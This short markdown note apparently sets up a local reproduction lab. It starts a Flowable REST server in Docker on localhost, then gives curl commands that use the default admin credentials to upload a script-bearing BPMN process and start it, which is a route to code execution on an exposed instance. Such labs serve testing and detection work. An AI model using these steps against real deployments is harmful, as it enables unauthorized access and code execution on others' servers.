# Exposed UI Setup
```bash
docker run -p 127.0.0.1:8080:8080 flowable/flowable-rest
```

# How to Exploit the Exposed UI
```bash
curl -X POST \
    'http://localhost:8080/flowable-rest/service/repository/deployments' \
    -H 'Content-Type: multipart/form-data' \
    -H "Authorization: Basic cmVzdC1hZG1pbjp0ZXN0" \
    -F 'file=@jsScript.bpmn'

curl -X POST \
    'http://localhost:8080/flowable-rest/service/runtime/process-instances' \
    -H 'Content-Type: application/json' \
    -H "Authorization: Basic cmVzdC1hZG1pbjp0ZXN0" \
    -d '{
    "processDefinitionKey": "jsScriptProcess"
    }'
```